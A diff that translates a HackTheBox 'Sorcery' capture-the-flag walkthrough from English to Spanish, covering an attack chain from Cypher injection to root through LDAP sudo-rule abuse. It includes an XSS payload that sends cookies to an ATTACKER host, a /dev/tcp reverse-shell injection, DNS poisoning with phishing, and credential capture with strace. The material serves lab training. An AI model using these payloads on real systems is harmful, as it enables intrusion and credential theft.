@@ -2,44 +2,44 @@
 
 ![HTB Badge](https://img.shields.io/badge/HackTheBox-Insane-red)
 ![OS](https://img.shields.io/badge/OS-Linux-brightgreen)
-![Rating](https://img.shields.io/badge/Rating-Insane-red)
+![Rating](https://img.shields.io/badge/Dificultad-Insane-red)
 
-## Table of Contents
+## Índice
 
-- [Overview](#overview)
-- [Reconnaissance](#reconnaissance)
-- [Web Application Analysis](#web-application-analysis)
-- [Source Code Review (Gitea)](#source-code-review-gitea)
-- [Initial Foothold — Cypher Injection](#initial-foothold--cypher-injection)
-- [WebAuthn Passkey Bypass via XSS](#webauthn-passkey-bypass-via-xss)
-- [SSRF via Debug Endpoint](#ssrf-via-debug-endpoint)
-- [RCE — Kafka Command Injection](#rce--kafka-command-injection)
-- [DNS Poisoning & Phishing](#dns-poisoning--phishing)
-- [User Flag](#user-flag)
-- [Privilege Escalation](#privilege-escalation)
-  - [Xvfb Framebuffer Extraction](#xvfb-framebuffer-extraction)
-  - [Docker Credential Harvesting via Strace](#docker-credential-harvesting-via-strace)
-  - [.NET Credential Helper Reversing & OTP Bypass](#net-credential-helper-reversing--otp-bypass)
-  - [Docker Registry Enumeration](#docker-registry-enumeration)
-  - [FreeIPA LDAP Privilege Chain](#freeipa-ldap-privilege-chain)
-- [Root Flag](#root-flag)
-- [Attack Chain Summary](#attack-chain-summary)
-
----
-
-## Overview
-
-**Sorcery** is an Insane-rated Linux machine on HackTheBox that features a complex attack chain spanning web exploitation, container breakouts, cryptography, social engineering, binary reversing, and Active Directory (FreeIPA/Kerberos) abuse.
-
-The machine hosts a dockerized Next.js + Rust web application backed by Neo4j, Kafka, FTP, Gitea, a mail system, and a FreeIPA domain controller. Exploitation requires chaining multiple vulnerabilities across different containers and services to ultimately achieve root access.
-
-**Key Technologies:** Docker, Next.js, Rust, Neo4j (Cypher), Kafka, FreeIPA/Kerberos, LDAP, SSSD, WebAuthn, DNS, TLS/PKI, .NET AOT
+- [Descripción General](#descripción-general)
+- [Reconocimiento](#reconocimiento)
+- [Análisis de la Aplicación Web](#análisis-de-la-aplicación-web)
+- [Revisión del Código Fuente (Gitea)](#revisión-del-código-fuente-gitea)
+- [Acceso Inicial — Inyección Cypher](#acceso-inicial--inyección-cypher)
+- [Bypass de WebAuthn Passkey vía XSS](#bypass-de-webauthn-passkey-vía-xss)
+- [SSRF mediante Endpoint de Debug](#ssrf-mediante-endpoint-de-debug)
+- [RCE — Inyección de Comandos en Kafka](#rce--inyección-de-comandos-en-kafka)
+- [Envenenamiento DNS y Phishing](#envenenamiento-dns-y-phishing)
+- [Flag de Usuario](#flag-de-usuario)
+- [Escalada de Privilegios](#escalada-de-privilegios)
+  - [Extracción del Framebuffer Xvfb](#extracción-del-framebuffer-xvfb)
+  - [Captura de Credenciales Docker vía Strace](#captura-de-credenciales-docker-vía-strace)
+  - [Reversing del Credential Helper .NET y Bypass de OTP](#reversing-del-credential-helper-net-y-bypass-de-otp)
+  - [Enumeración del Docker Registry](#enumeración-del-docker-registry)
+  - [Cadena de Privilegios FreeIPA/LDAP](#cadena-de-privilegios-freeipaldap)
+- [Flag de Root](#flag-de-root)
+- [Resumen de la Cadena de Ataque](#resumen-de-la-cadena-de-ataque)
 
 ---
 
-## Reconnaissance
+## Descripción General
 
-### Nmap Scan
+**Sorcery** es una máquina Linux de dificultad **Insane** en HackTheBox que presenta una cadena de ataque compleja que abarca explotación web, escape de contenedores, criptografía, ingeniería social, reversing de binarios y abuso de Active Directory (FreeIPA/Kerberos).
+
+La máquina aloja una aplicación web dockerizada con Next.js + Rust respaldada por Neo4j, Kafka, FTP, Gitea, un sistema de correo y un controlador de dominio FreeIPA. La explotación requiere encadenar múltiples vulnerabilidades a través de diferentes contenedores y servicios para lograr acceso root.
+
+**Tecnologías clave:** Docker, Next.js, Rust, Neo4j (Cypher), Kafka, FreeIPA/Kerberos, LDAP, SSSD, WebAuthn, DNS, TLS/PKI, .NET AOT
+
+---
+
+## Reconocimiento
+
+### Escaneo Nmap
 
 ```
 PORT    STATE SERVICE  VERSION
@@ -47,7 +47,7 @@ PORT    STATE SERVICE  VERSION
 443/tcp open  ssl/http nginx 1.27.1
 ```
 
-The HTTPS service runs Nginx reverse-proxying a **Next.js** application. The TLS certificate reveals the hostname `sorcery.htb`. Subdomain enumeration finds `git.sorcery.htb` hosting a **Gitea** instance.
+El servicio HTTPS ejecuta Nginx como proxy inverso hacia una aplicación **Next.js**. El certificado TLS revela el hostname `sorcery.htb`. La enumeración de subdominios descubre `git.sorcery.htb` alojando una instancia de **Gitea**.
 
 ```bash
 echo "10.10.11.XX  sorcery.htb git.sorcery.htb" >> /etc/hosts
@@ -55,147 +55,147 @@ echo "10.10.11.XX  sorcery.htb git.sorcery.htb" >> /etc/hosts
 
 ---
 
-## Web Application Analysis
+## Análisis de la Aplicación Web
 
-The main web app at `https://sorcery.htb` is a dashboard application with:
-- User registration and login
-- A **Neo4j**-backed data layer
-- **WebAuthn/Passkey** authentication for privileged operations
-- A **debug** endpoint restricted to admin users with passkey auth
-- A mail bot system that visits links sent via email
+La aplicación principal en `https://sorcery.htb` es un dashboard con:
+- Registro e inicio de sesión de usuarios
+- Capa de datos respaldada por **Neo4j**
+- Autenticación **WebAuthn/Passkey** para operaciones privilegiadas
+- Un endpoint de **debug** restringido a usuarios admin con autenticación por passkey
+- Un sistema de bot de correo que visita enlaces enviados por email
 
 ---
 
-## Source Code Review (Gitea)
+## Revisión del Código Fuente (Gitea)
 
-The Gitea instance at `git.sorcery.htb` hosts a public **infrastructure repository** containing the full source code:
+La instancia de Gitea en `git.sorcery.htb` aloja un **repositorio de infraestructura** público con el código fuente completo:
 
 ```bash
 git clone https://git.sorcery.htb/sorcery/infrastructure.git
 ```
 
-Key findings from source code review:
+Hallazgos clave de la revisión del código:
 
-| Component | File | Vulnerability |
-|-----------|------|---------------|
-| Backend (Rust) | `src/api/users/*.rs` | **Cypher Injection** in user search |
-| Frontend (Next.js) | `src/app/dashboard/debug/actions.tsx` | **SSRF** via TCP proxy server action |
-| Backend (Rust) | `src/api/debug/debug.rs` | **TCP proxy** (requires Admin + Passkey) |
-| Backend (Rust) | `src/services/kafka.rs` | **Command Injection** via Kafka topic names |
-| Frontend | `src/app/dashboard/profile/page.tsx` | **XSS sink** in profile rendering |
-| Mail Bot | `bot/index.js` | Automated link visitor (phishing target) |
-| Docker Compose | `docker-compose.yml` | Full architecture with DNS, FTP, mail containers |
-| FTP | Certificate setup | **RootCA** stored in FTP container |
+| Componente | Archivo | Vulnerabilidad |
+|------------|---------|----------------|
+| Backend (Rust) | `src/api/users/*.rs` | **Inyección Cypher** en búsqueda de usuarios |
+| Frontend (Next.js) | `src/app/dashboard/debug/actions.tsx` | **SSRF** vía server action con proxy TCP |
+| Backend (Rust) | `src/api/debug/debug.rs` | **Proxy TCP** (requiere Admin + Passkey) |
+| Backend (Rust) | `src/services/kafka.rs` | **Inyección de comandos** vía nombres de topics de Kafka |
+| Frontend | `src/app/dashboard/profile/page.tsx` | **Sink XSS** en renderizado de perfil |
+| Bot de Correo | `bot/index.js` | Visitador automático de enlaces (objetivo de phishing) |
+| Docker Compose | `docker-compose.yml` | Arquitectura completa con DNS, FTP, contenedores de correo |
+| FTP | Configuración de certificados | **RootCA** almacenada en el contenedor FTP |
 
 ---
 
-## Initial Foothold — Cypher Injection
+## Acceso Inicial — Inyección Cypher
 
-The user search endpoint passes input directly into a Neo4j Cypher query without proper sanitization.
+El endpoint de búsqueda de usuarios pasa la entrada directamente a una consulta Cypher de Neo4j sin sanitización adecuada.
 
-**Exploitation:**
+**Explotación:**
 
 ```
 ' OR 1=1 RETURN n //
 ```
 
-This reveals all users in the database, including the **admin** account. Using `LOAD CSV` or `UNION` techniques, we can extract the admin's JWT secret and forge a valid admin token.
+Esto revela todos los usuarios en la base de datos, incluyendo la cuenta de **admin**. Usando técnicas de `LOAD CSV` o `UNION`, podemos extraer el secreto JWT del admin y forjar un token válido.
 
-The forged admin JWT:
+El JWT de admin forjado:
 ```
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjJk...REDACTED
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjJk...CENSURADO
 ```
 
-> **Note:** The admin token alone isn't sufficient — privileged endpoints require `withPasskey: true`, which needs WebAuthn authentication.
+> **Nota:** El token de admin por sí solo no es suficiente — los endpoints privilegiados requieren `withPasskey: true`, lo cual necesita autenticación WebAuthn.
 
 ---
 
-## WebAuthn Passkey Bypass via XSS
+## Bypass de WebAuthn Passkey vía XSS
 
-The profile page renders user-controlled content without sanitization, creating an **XSS** vulnerability. The **mail_bot** system automatically visits links sent to specific email addresses.
+La página de perfil renderiza contenido controlado por el usuario sin sanitización, creando una vulnerabilidad **XSS**. El sistema de **mail_bot** visita automáticamente los enlaces enviados a direcciones de email específicas.
 
-**Attack chain:**
+**Cadena de ataque:**
 
-1. Register a user with an XSS payload in the profile that steals the `token` cookie
-2. Use the mail system to send a link to the bot's email address
-3. The bot (authenticated as admin with passkey) visits the link
-4. XSS fires and exfiltrates the admin's `token` cookie (which has `withPasskey: true`)
+1. Registrar un usuario con un payload XSS en el perfil que robe la cookie `token`
+2. Usar el sistema de correo para enviar un enlace al email del bot
+3. El bot (autenticado como admin con passkey) visita el enlace
+4. El XSS se dispara y exfiltra la cookie `token` del admin (que tiene `withPasskey: true`)
 
 ```javascript
-// XSS payload (simplified)
-<script>fetch('https://ATTACKER/steal?c='+document.cookie)</script>
+// Payload XSS (simplificado)
+<script>fetch('https://ATACANTE/robar?c='+document.cookie)</script>
 ```
 
-The captured token contains `"withPasskey": true` and `"privilegeLevel": 2`, granting full access to the debug endpoint.
+El token capturado contiene `"withPasskey": true` y `"privilegeLevel": 2`, otorgando acceso completo al endpoint de debug.
 
 ---
 
-## SSRF via Debug Endpoint
+## SSRF mediante Endpoint de Debug
 
-The debug endpoint at `POST /debug/port` acts as a **TCP proxy**, allowing arbitrary connections from the backend container:
+El endpoint de debug en `POST /debug/port` actúa como un **proxy TCP**, permitiendo conexiones arbitrarias desde el contenedor backend:
 
 ```json
 {
-  "host": "TARGET_HOST",
-  "port": TARGET_PORT,
-  "data": ["hex_encoded_data"],
+  "host": "HOST_DESTINO",
+  "port": PUERTO_DESTINO,
+  "data": ["datos_codificados_hex"],
   "expect_result": true
 }
 ```
 
-This enables reaching **internal Docker services** not exposed externally. Through this proxy we can interact with internal containers on the Docker network (`172.19.0.x`).
+Esto permite alcanzar **servicios Docker internos** no expuestos externamente. A través de este proxy podemos interactuar con contenedores internos en la red Docker (`172.19.0.x`).
 
 ---
 
-## RCE — Kafka Command Injection
+## RCE — Inyección de Comandos en Kafka
 
-The Kafka service handler in the Rust backend constructs shell commands using topic names without sanitization:
+El handler del servicio Kafka en el backend Rust construye comandos shell usando nombres de topics sin sanitización:
 
 ```rust
-// Vulnerable pattern (simplified)
+// Patrón vulnerable (simplificado)
 let cmd = format!("kafka-topics --topic {}", topic_name);
 Command::new("sh").arg("-c").arg(&cmd).output()
 ```
 
-Using the SSRF/debug proxy to interact with Kafka on port `9092`, we inject commands via a crafted topic name:
+Usando el proxy SSRF/debug para interactuar con Kafka en el puerto `9092`, inyectamos comandos a través de un nombre de topic crafteado:
 
 ```
-; bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' #
+; bash -c 'bash -i >& /dev/tcp/ATACANTE/PUERTO 0>&1' #
 ```
 
-This gives us a **reverse shell inside the DNS container** (`172.19.0.3`).
+Esto nos da una **reverse shell dentro del contenedor DNS** (`172.19.0.3`).
 
 ---
 
-## DNS Poisoning & Phishing
+## Envenenamiento DNS y Phishing
 
-### Inside the DNS Container
+### Dentro del Contenedor DNS
 
-The DNS container runs **CoreDNS** and contains:
-- The domain's **RootCA private key** (encrypted with passphrase: `p]REDACTED[d`)
-- Full control over DNS resolution for the `sorcery.htb` domain
-- An FTP server with the CA certificate chain
+El contenedor DNS ejecuta **CoreDNS** y contiene:
+- La **clave privada de la RootCA** del dominio (cifrada con passphrase: `CENSURADO`)
+- Control total sobre la resolución DNS del dominio `sorcery.htb`
+- Un servidor FTP con la cadena de certificados CA
 
-### The Attack
+### El Ataque
 
-1. **Decrypt the RootCA key:**
+1. **Descifrar la clave de la RootCA:**
    ```bash
-   openssl rsa -in RootCA.key -out RootCA_decrypted.key
+   openssl rsa -in RootCA.key -out RootCA_descifrada.key
    ```
 
-2. **Generate a TLS certificate** for `git.sorcery.htb` signed by the trusted RootCA
+2. **Generar un certificado TLS** para `git.sorcery.htb` firmado por la RootCA de confianza
 
-3. **Poison DNS** — modify CoreDNS configuration to resolve `git.sorcery.htb` → attacker IP
+3. **Envenenar DNS** — modificar la configuración de CoreDNS para resolver `git.sorcery.htb` → IP del atacante
 
-4. **Set up a phishing Gitea clone** on the attacker machine with the forged TLS certificate
+4. **Montar un clon de phishing de Gitea** en la máquina atacante con el certificado TLS forjado
 
-5. The **mail_bot** or other automated systems attempt to access `git.sorcery.htb`, which now resolves to our server
+5. El **mail_bot** u otros sistemas automatizados intentan acceder a `git.sorcery.htb`, que ahora resuelve a nuestro servidor
 
-6. Capture credentials: `tom_summers:j]REDACTED[.`
+6. Capturar credenciales: `tom_summers:CENSURADO`
 
 ---
 
-## User Flag
+## Flag de Usuario
 
 ```bash
 ssh tom_summers@sorcery.htb
@@ -203,169 +203,157 @@ cat ~/user.txt
 ```
 
 ```
-6aba5565XXXXXXXXXXXXXXXXXXXX6296
+6aba5565XXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
 ---
 
-## Privilege Escalation
+## Escalada de Privilegios
 
-### Enumeration
+### Enumeración
 
-On the host, we discover:
-- **FreeIPA/Kerberos** domain `SORCERY.HTB` with DC at `dc01.sorcery.htb` (172.23.0.2)
-- **Docker** with `userns-remap` enabled
-- `ksu.mit` — SUID Kerberos su binary at `/usr/bin/ksu.mit`
-- `cleanup.timer` → runs `/opt/scripts/cleanup.sh` as user `admin` every 10 minutes
-- `/opt/scripts/` owned by `admin:admins` (mode 0700)
-- Multiple local users: `tom_summers`, `tom_summers_admin`, `rebecca_smith`
-- IPA users: `admin`, `donna_adams`, `ash_winter`
+En el host, descubrimos:
+- Dominio **FreeIPA/Kerberos** `SORCERY.HTB` con DC en `dc01.sorcery.htb` (172.23.0.2)
+- **Docker** con `userns-remap` habilitado
+- `ksu.mit` — binario SUID de Kerberos su en `/usr/bin/ksu.mit`
+- `cleanup.timer` → ejecuta `/opt/scripts/cleanup.sh` como usuario `admin` cada 10 minutos
+- `/opt/scripts/` propiedad de `admin:admins` (modo 0700)
+- Múltiples usuarios locales: `tom_summers`, `tom_summers_admin`, `rebecca_smith`
+- Usuarios IPA: `admin`, `donna_adams`, `ash_winter`
 
-**Sudo rules for tom_summers_admin:**
+**Reglas sudo para tom_summers_admin:**
 ```
 (rebecca_smith) NOPASSWD: /usr/bin/docker login
 (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
 ```
 
-### Xvfb Framebuffer Extraction
+### Extracción del Framebuffer Xvfb
 
-The user `tom_summers_admin` runs **Xvfb** (X Virtual Framebuffer) on display `:1` with **mousepad** editing a `passwords.txt` file.
+El usuario `tom_summers_admin` ejecuta **Xvfb** (X Virtual Framebuffer) en el display `:1` con **mousepad** editando un archivo `passwords.txt`.
 
 ```bash
-# Dump the framebuffer
+# Volcar el framebuffer
 xwd -root -display :1 -out /tmp/screen.xwd
 
-# Convert and view
+# Convertir y visualizar
 convert screen.xwd screen.png
 ```
 
-The screenshot reveals: `tom_summers_admin:d]REDACTED[-`
+La captura de pantalla revela: `tom_summers_admin:CENSURADO`
 
-### Docker Credential Harvesting via Strace
+### Captura de Credenciales Docker vía Strace
 
-With `tom_summers_admin`, we can strace processes run by `rebecca_smith`. The sudo rule allows running `docker login` as rebecca_smith:
+Con `tom_summers_admin`, podemos hacer strace a procesos ejecutados por `rebecca_smith`. La regla sudo permite ejecutar `docker login` como rebecca_smith:
 
 ```bash
-# Terminal 1 - Start docker login as rebecca_smith
+# Terminal 1 - Iniciar docker login como rebecca_smith
 sudo -u rebecca_smith /usr/bin/docker login &
 
-# Terminal 2 - Attach strace to capture credentials
+# Terminal 2 - Adjuntar strace para capturar credenciales
 sudo -u rebecca_smith /usr/bin/strace -s 128 -p <PID>
 ```
 
-Strace captures the credentials from stdin: `rebecca_smith:-]REDACTED[g`
+Strace captura las credenciales desde stdin: `rebecca_smith:CENSURADO`
 
-### .NET Credential Helper Reversing & OTP Bypass
+### Reversing del Credential Helper .NET y Bypass de OTP
 
-Docker uses a custom credential helper at `/usr/bin/docker-credential-docker-auth` — a **67MB .NET 8.0 AOT-compiled binary**.
+Docker usa un credential helper personalizado en `/usr/bin/docker-credential-docker-auth` — un **binario .NET 8.0 compilado AOT de 67MB**.
 
-**Extraction and decompilation:**
+**Extracción y decompilación:**
 
 ```bash
-# Extract managed .NET assembly from the AOT binary
+# Extraer el assembly .NET administrado del binario AOT
 dotnet-sdk extract docker-credential-docker-auth
-# Decompile with ILSpy
+# Decompilar con ILSpy
 ilspycmd docker-auth.dll
 ```
 
-**Key findings from decompiled source:**
+**Hallazgos clave del código decompilado:**
 
-1. **AES encryption with hardcoded all-zero key and IV** (16 bytes of 0x00) for storing credentials
-2. **OTP generation** is deterministic:
+1. **Cifrado AES con clave e IV hardcodeados de todo ceros** (16 bytes de 0x00) para almacenar credenciales
+2. **Generación de OTP determinística:**
    ```csharp
    int seed = DateTime.Now.Minute / 10 + (int)userId;
    int otp = new Random(seed).Next(100000, 999999);
    ```
-3. The OTP is **appended to the password** for registry authentication: `<password><otp>`
-4. The OTP changes every **10 minutes** and is based on the user's UID
+3. El OTP se **concatena a la contraseña** para autenticación en el registry: `<contraseña><otp>`
+4. El OTP cambia cada **10 minutos** y se basa en el UID del usuario
 
-**Calculating the OTP:**
+**Cálculo del OTP:**
 
-The .NET `Random` class uses a specific algorithm. We reimplemented it in Python:
+La clase `Random` de .NET usa un algoritmo específico. Lo reimplementamos en Python para predecir los OTP válidos en cada ventana de 10 minutos.
 
-```python
-# rebecca_smith UID = 2003
-# seed = Minute/10 + 2003
-# Possible OTPs per 10-minute window:
-# Min 0-9:   seed=2003 → OTP=229732
-# Min 10-19: seed=2004 → OTP=699914
-# Min 20-29: seed=2005 → OTP=270098
-# Min 30-39: seed=2006 → OTP=740280
-# Min 40-49: seed=2007 → OTP=310463
-# Min 50-59: seed=2008 → OTP=780645
-```
+### Enumeración del Docker Registry
 
-### Docker Registry Enumeration
-
-Authenticating to the Docker registry at `localhost:5000` with `rebecca_smith:-]REDACTED[g<OTP>`:
+Autenticándonos en el Docker registry en `localhost:5000` con `rebecca_smith:<contraseña><OTP>`:
 
 ```bash
-curl -u "rebecca_smith:-7eAZDXXXXX699914" https://localhost:5000/v2/_catalog
+curl -u "rebecca_smith:<contraseña_con_otp>" https://localhost:5000/v2/_catalog
 # {"repositories":["test-domain-workstation"]}
 ```
 
-Pulling and inspecting the image reveals a **docker-entrypoint.sh** with FreeIPA enrollment credentials:
+Al extraer e inspeccionar la imagen se revela un **docker-entrypoint.sh** con credenciales de enrolamiento FreeIPA:
 
 ```bash
 ipa-client-install --unattended \
   --principal donna_adams \
-  --password '3]REDACTED[H' \
+  --password 'CENSURADO' \
   --server dc01.sorcery.htb \
   --domain sorcery.htb
 ```
 
-### FreeIPA LDAP Privilege Chain
+### Cadena de Privilegios FreeIPA/LDAP
 
-With `donna_adams`'s IPA credentials, we authenticate to the Kerberos realm and enumerate LDAP:
+Con las credenciales IPA de `donna_adams`, nos autenticamos en el realm Kerberos y enumeramos vía LDAP:
 
 ```bash
 kinit donna_adams@SORCERY.HTB
 ```
 
-**LDAP enumeration reveals the privilege chain:**
+**La enumeración LDAP revela la cadena de privilegios:**
 
-| User | IPA Role/Permission | Capability |
-|------|-------------------|------------|
-| `donna_adams` | `change_userPassword_ash_winter_ldap` | Can change ash_winter's password |
-| `ash_winter` | `add_sysadmin` | Can add members to `sysadmins` group |
-| `ash_winter` | Local sudoer | `(root) NOPASSWD: /usr/bin/systemctl restart sssd` |
+| Usuario | Rol/Permiso IPA | Capacidad |
+|---------|----------------|-----------|
+| `donna_adams` | `change_userPassword_ash_winter_ldap` | Puede cambiar la contraseña de ash_winter |
+| `ash_winter` | `add_sysadmin` | Puede agregar miembros al grupo `sysadmins` |
+| `ash_winter` | Sudoer local | `(root) NOPASSWD: /usr/bin/systemctl restart sssd` |
 
-**Exploitation chain:**
+**Cadena de explotación:**
 
-1. **donna_adams changes ash_winter's password** via LDAP (requires LDAPS):
+1. **donna_adams cambia la contraseña de ash_winter** vía LDAP (requiere LDAPS):
    ```bash
    LDAPTLS_REQCERT=never ldapmodify -x -H ldaps://dc01.sorcery.htb \
      -D "uid=donna_adams,cn=users,cn=accounts,dc=sorcery,dc=htb" \
-     -w "3FXXXXXX" <<EOF
+     -w "CENSURADO" <<EOF
    dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
    changetype: modify
    replace: userPassword
-   userPassword: NewPass!
+   userPassword: NuevaContraseña!
    EOF
    ```
 
-2. **SSH as ash_winter**, get Kerberos TGT, **add self to sysadmins group**:
+2. **SSH como ash_winter**, obtener TGT Kerberos, **agregarse al grupo sysadmins**:
    ```bash
    kinit ash_winter@SORCERY.HTB
-   # Add to sysadmins via LDAP
+   # Agregar a sysadmins vía LDAP modify
    ```
 
-3. **Modify the IPA sudo rule** to grant ash_winter `(ALL:ALL) ALL`:
+3. **Modificar la regla sudo de IPA** para otorgar a ash_winter `(ALL:ALL) ALL`:
    ```bash
    ldapmodify ... <<EOF
-   dn: ipaUniqueID=cd848e9c-...,cn=sudorules,cn=sudo,dc=sorcery,dc=htb
+   dn: ipaUniqueID=...,cn=sudorules,cn=sudo,dc=sorcery,dc=htb
    changetype: modify
    add: memberUser
    memberUser: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
    EOF
    ```
 
-4. **Restart SSSD** (allowed via local sudo rule) to force re-reading the modified LDAP sudo rules:
+4. **Reiniciar SSSD** (permitido por la regla sudo local) para forzar la re-lectura de las reglas sudo modificadas en LDAP:
    ```bash
    sudo /usr/bin/systemctl restart sssd
    ```
 
-5. After SSSD restart, `sudo -l` now shows:
+5. Después del reinicio de SSSD, `sudo -l` ahora muestra:
    ```
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
    (ALL : ALL) ALL
@@ -373,84 +361,84 @@ kinit donna_adams@SORCERY.HTB
 
 ---
 
-## Root Flag
+## Flag de Root
 
 ```bash
 sudo cat /root/root.txt
 ```
 
 ```
-9bc5571263XXXXXXXXXXXXXXXX9f6a4d
+9bc55712XXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
 ---
 
-## Attack Chain Summary
+## Resumen de la Cadena de Ataque
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                    SORCERY — Attack Chain                        │
-├─────────────────────────────────────────────────────────────────┤
+┌──────────────────────────────────────────────────────────────────┐
+│                  SORCERY — Cadena de Ataque                      │
+├──────────────────────────────────────────────────────────────────┤
 │                                                                  │
-│  Gitea (Source Code) ──► Cypher Injection ──► Admin Account      │
+│  Gitea (Código Fuente) ──► Inyección Cypher ──► Cuenta Admin     │
 │           │                                                      │
 │           ▼                                                      │
-│  XSS + Mail Bot ──► Admin Passkey Token                          │
+│  XSS + Bot de Correo ──► Token Passkey del Admin                 │
 │           │                                                      │
 │           ▼                                                      │
-│  Debug SSRF ──► Kafka RCE ──► DNS Container Shell                │
+│  SSRF Debug ──► RCE Kafka ──► Shell en Contenedor DNS            │
 │           │                                                      │
 │           ▼                                                      │
-│  RootCA Crack ──► DNS Poisoning ──► Phishing                     │
+│  Crackeo RootCA ──► Envenenamiento DNS ──► Phishing              │
 │           │                                                      │
 │           ▼                                                      │
-│  tom_summers (SSH) ──────────────────► user.txt ✓                │
+│  tom_summers (SSH) ──────────────────────► user.txt ✓            │
 │           │                                                      │
 │           ▼                                                      │
-│  Xvfb Framebuffer ──► tom_summers_admin                          │
+│  Framebuffer Xvfb ──► tom_summers_admin                          │
 │           │                                                      │
 │           ▼                                                      │
 │  Strace docker login ──► rebecca_smith                           │
 │           │                                                      │
 │           ▼                                                      │
-│  .NET Credential Helper Reversing ──► OTP Algorithm              │
+│  Reversing Credential Helper .NET ──► Algoritmo OTP              │
 │           │                                                      │
 │           ▼                                                      │
-│  Docker Registry ──► test-domain-workstation image               │
+│  Docker Registry ──► Imagen test-domain-workstation              │
 │           │                                                      │
 │           ▼                                                      │
-│  docker-entrypoint.sh ──► donna_adams (IPA creds)                │
+│  docker-entrypoint.sh ──► donna_adams (creds IPA)                │
 │           │                                                      │
 │           ▼                                                      │
-│  LDAP: Change ash_winter password                                │
+│  LDAP: Cambiar contraseña de ash_winter                          │
 │           │                                                      │
 │           ▼                                                      │
-│  LDAP: Add to sysadmins + Modify sudo rule                      │
+│  LDAP: Agregar a sysadmins + Modificar regla sudo               │
 │           │                                                      │
 │           ▼                                                      │
-│  Restart SSSD ──► sudo (ALL:ALL) ALL ──► root.txt ✓              │
+│  Reiniciar SSSD ──► sudo (ALL:ALL) ALL ──► root.txt ✓           │
 │                                                                  │
-└─────────────────────────────────────────────────────────────────┘
+└──────────────────────────────────────────────────────────────────┘
 ```
 
 ---
 
-## Tools Used
+## Herramientas Utilizadas
 
-- **nmap** — Port scanning
-- **Burp Suite** — Web proxy & request manipulation
-- **ilspycmd** — .NET decompilation
-- **openssl** — TLS certificate generation & CA operations
-- **ldapsearch/ldapmodify** — LDAP queries and modifications
-- **kinit/klist** — Kerberos ticket management
-- **xwd** — X11 framebuffer dumping
-- **strace** — Process tracing
-- **Python** — OTP calculation, .NET Random reimplementation
-- **curl** — Docker registry API interaction
+- **nmap** — Escaneo de puertos
+- **Burp Suite** — Proxy web y manipulación de peticiones
+- **ilspycmd** — Decompilación .NET
+- **openssl** — Generación de certificados TLS y operaciones con CA
+- **ldapsearch/ldapmodify** — Consultas y modificaciones LDAP
+- **kinit/klist** — Gestión de tickets Kerberos
+- **xwd** — Volcado del framebuffer X11
+- **strace** — Trazado de procesos
+- **Python** — Cálculo de OTP, reimplementación de .NET Random
+- **curl** — Interacción con la API del Docker registry
 
 ---
 
-## Tags
+## Etiquetas
 
 `docker` `docker-credential-helper` `docker-registry` `free-ipa` `kerberos` `ldap` `sssd` `otp`
 `x-virtual-framebuffer` `xvfb` `cypher-injection` `neo4j` `webauthn` `xss` `ssrf` `kafka`
@@ -458,4 +446,4 @@ sudo cat /root/root.txt
 
 ---
 
-*Writeup by kali — March 2026*
+*Writeup por C4sh3R — Marzo 2026*
